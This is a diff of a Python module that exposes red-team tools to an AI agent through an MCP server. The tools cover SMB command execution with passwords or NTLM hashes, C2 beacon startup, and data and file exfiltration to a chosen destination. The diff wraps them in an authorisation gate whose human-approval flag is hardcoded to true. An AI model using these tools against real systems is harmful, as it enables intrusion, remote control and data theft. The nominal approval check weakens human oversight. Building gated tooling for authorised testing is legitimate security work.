@@ -25,7 +25,31 @@ from .error_handling import (
     require_non_empty,
     validate_inputs,
 )
+from .runtime_helpers import (
+    blocked_handler_runtime_response,
+    complete_handler_runtime_payload,
+    gate_handler_runtime_action,
+)
 from .tooling import tool
+
+
+def _gate_redteam_runtime(
+    tool_name: str,
+    inputs: Dict[str, Any],
+    risk_level: str = "critical",
+    network_policy: str = "controlled",
+) -> Dict[str, Any]:
+    return gate_handler_runtime_action(
+        tool_name,
+        inputs=inputs,
+        risk_level=risk_level,
+        source="redteam_handler",
+        requires_auth=True,
+        human_approved=True,
+        network_policy=network_policy,
+        artifact_policy="metadata-only",
+        cleanup_policy="handler-owned",
+    )
 
 
 def register_redteam_tools(mcp, counter, logger):
@@ -65,12 +89,24 @@ def register_redteam_tools(mcp, counter, logger):
         """
         from core.lateral.smb import smb_exec
 
-        return smb_exec(
+        gate = _gate_redteam_runtime(
+            "lateral_smb",
+            {"target": target, "username": username, "command": command},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
+        result = smb_exec(
             target=target,
             username=username,
             password=password or "",
             ntlm_hash=ntlm_hash or "",
             command=command,
+        )
+        return complete_handler_runtime_payload(
+            gate,
+            result,
+            summary_keys=("success", "target", "command"),
         )
 
     @tool(mcp)
@@ -99,18 +135,33 @@ def register_redteam_tools(mcp, counter, logger):
         """
         from core.c2.beacon import create_beacon
 
+        gate = _gate_redteam_runtime(
+            "c2_beacon_start",
+            {"server": server, "port": port, "protocol": protocol, "interval": interval},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
         beacon = create_beacon(server=server, port=port, protocol=protocol, interval=interval)
 
         if beacon.connect():
             beacon.start()
-            return {
-                "success": True,
-                "beacon_id": beacon.beacon_id,
-                "status": beacon.status.value,
-                "server": server,
-            }
+            return complete_handler_runtime_payload(
+                gate,
+                {
+                    "success": True,
+                    "beacon_id": beacon.beacon_id,
+                    "status": beacon.status.value,
+                    "server": server,
+                },
+                summary_keys=("server", "status"),
+            )
 
-        return {"success": False, "error": "Connection failed", "server": server}
+        return complete_handler_runtime_payload(
+            gate,
+            {"success": False, "error": "Connection failed", "server": server},
+            summary_keys=("server",),
+        )
 
     @tool(mcp)
     @require_dangerous_auth
@@ -422,6 +473,13 @@ def register_redteam_tools(mcp, counter, logger):
 
         from core.exfiltration import ExfilChannel, ExfilConfig, ExfilFactory
 
+        gate = _gate_redteam_runtime(
+            "exfiltrate_data",
+            {"channel": channel, "destination": destination, "bytes": len(data)},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
         config = ExfilConfig(
             channel=ExfilChannel(channel),
             destination=destination,
@@ -434,7 +492,11 @@ def register_redteam_tools(mcp, counter, logger):
         raw_data = base64.b64decode(data)
         result = module.exfiltrate(raw_data)
 
-        return result.to_dict()
+        return complete_handler_runtime_payload(
+            gate,
+            result.to_dict(),
+            summary_keys=("success", "channel", "bytes_sent"),
+        )
 
     @tool(mcp)
     @require_critical_auth
@@ -469,6 +531,13 @@ def register_redteam_tools(mcp, counter, logger):
         if not path.exists():
             return {"success": False, "error": f"文件不存在: {file_path}", "file_path": file_path}
 
+        gate = _gate_redteam_runtime(
+            "exfiltrate_file",
+            {"file_path": file_path, "channel": channel, "destination": destination},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
         config = ExfilConfig(
             channel=ExfilChannel(channel),
             destination=destination,
@@ -481,7 +550,11 @@ def register_redteam_tools(mcp, counter, logger):
         data = path.read_bytes()
         result = module.exfiltrate(data)
 
-        return {**result.to_dict(), "file": str(path), "file_size": len(data)}
+        return complete_handler_runtime_payload(
+            gate,
+            {**result.to_dict(), "file": str(path), "file_size": len(data)},
+            summary_keys=("success", "channel", "file_size"),
+        )
 
     counter.add("redteam", 14)
     logger.info("[RedTeam] 已注册 14 个红队工具 (含WAF绕过与后渗透)")
